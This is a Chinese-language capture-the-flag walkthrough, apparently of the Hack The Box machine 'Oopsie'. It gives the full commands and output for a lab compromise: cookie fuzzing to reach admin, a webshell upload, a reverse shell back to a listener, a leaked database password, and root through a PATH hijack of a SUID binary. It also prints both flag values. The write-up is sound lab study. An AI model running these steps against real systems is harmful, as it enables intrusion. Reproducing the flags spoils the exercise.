![image.png|1353](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320154705809.png)
---
## 扫描端口

```
└─$ sudo  nmap -sS -Pn  -T4 -O 10.129.28.222
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-20 03:58 EDT
Nmap scan report for 10.129.28.222
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds

```
## 访问web目录
![image.png|955](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160123532.png)

### 查看源码，搜索login关键字得到：
`<script src="[/cdn-cgi/login/script.js](view-source:http://10.129.28.222/cdn-cgi/login/script.js)"></script>`
### 访问得到登陆界面
![image.png|996](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160200369.png)

### 尝试爆破密码未成功，点击`[Login as Guest]`,进入后台，并点击Account
### 拦截流量并对cookie中的参数进行fuzz
![image.png|1253](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160643942.png)
![image.png|1274](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160754542.png)

### 测试出34322 / admin 以及 2233 / guest这两个账户
![image.png|1401](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320161840320.png)
### 用fuzz得到的admin cookie去访问Uploads页面
![image.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320162057208.png)
### 然后上传冰蝎shell（上传时也需要注意修改cookie为34322 / admin）
![image.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320162526183.png)
### 上传成功，但是不知道shell所在目录，所以需要fuzz出目录
```shell
└─$ gobuster dir -u http://10.129.28.222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.28.222
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.28.222/images/]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 10932]
/themes               (Status: 301) [Size: 315] [--> http://10.129.28.222/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.28.222/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.28.222/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.28.222/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.28.222/fonts/]

```
### 连接shell
![image.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320163914872.png)
### 本地开启nc监听，获取稳定shell
**上传reverse-shell并触发，获取shell**
```shell
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop 
                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ cd Desktop                                                 
                    
```

![image.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320164649390.png)

### 切换为交互式shell：`SHELL=/bin/bash script -q /dev/null`
```shell
┌──(kali㉿kali)-[~]
└─$ nc -vnlp 5678
listening on [any] 5678 ...
connect to [10.10.14.90] from (UNKNOWN) [10.129.28.222] 47640
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:46:31 up  1:23,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/
$ whoami
www-data
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ SHELL=/bin/bash script -q /dev/null
www-data@oopsie:/$ whoami
whoami
www-data
www-data@oopsie:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
www-data@oopsie:/var/www/html$ 
```
---
## 提权

### 进入web目录下，查看db.php，获取到数据库连接信息
```shell
www-data@oopsie:/var/www/html/cdn-cgi$ cd login
cd login
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php  db.php  index.php  script.js
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
www-data@oopsie:/var/www/html/cdn-cgi/login$ 

```
### 登陆robert账户，并查看相关权限
```shell
www-data@oopsie:/$su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
robert@oopsie:/$ sudo -l 
sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.
robert@oopsie:/$ 
```
### 发现robert用户属于bugtracker组，查找bugtracker
```shell
robert@oopsie:/$ find / -group bugtracker 2>/dev/null
find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
robert@oopsie:/$ /usr/bin/bugtracker -h
/usr/bin/bugtracker 
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: /root/flag.txt
/root/flag.txt
---------------

cat: /root/reports//root/flag.txt: No such file or directory

robert@oopsie:/$ ls -la /usr/bin/bugtracker
ls -la /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
robert@oopsie:/$ 

```
### 进入/tmp目录（因为可写），然后创建名为cat的文件（实际内容是启动一个 Shell），内容如下：
```shell
echo "/bin/sh" > cat
```
### 赋予/tmp/cat执行权限，然后劫持 PATH 环境变量：`export PATH=/tmp:$PATH`(告诉系统：当有人运行 `cat` 时，先去 `/tmp` 找，而不是去系统的 `/bin` 找)
### 然后再次执行/usr/bin/bugtracker触发提权
```shell
robert@oopsie:/$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ ls
ls
robert@oopsie:/tmp$ touch cat
touch cat
robert@oopsie:/tmp$ echo "/bin/sh" > cat          
echo "/bin/sh" > cat
robert@oopsie:/tmp$ ls
ls
cat
robert@oopsie:/tmp$ cat cat
cat cat
/bin/sh
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: auok
auok
---------------

# whoami
whoami
root
# ls
ls
cat
# pwd
pwd
/tmp
# cd /root
cd /root
# ls
ls
reports  root.txt
root@oopsie:/# cat /root/root.txt
cat /root/root.txt
af13b0bee69f8a877c3faf667f7beacf
root@oopsie:/# 
# su robert
su robert
robert@oopsie:/root$ cd
cd
robert@oopsie:~$ cd /
cd /
robert@oopsie:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
robert@oopsie:/$ cat /home/robert/user.txt
cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981
robert@oopsie:/$ 
```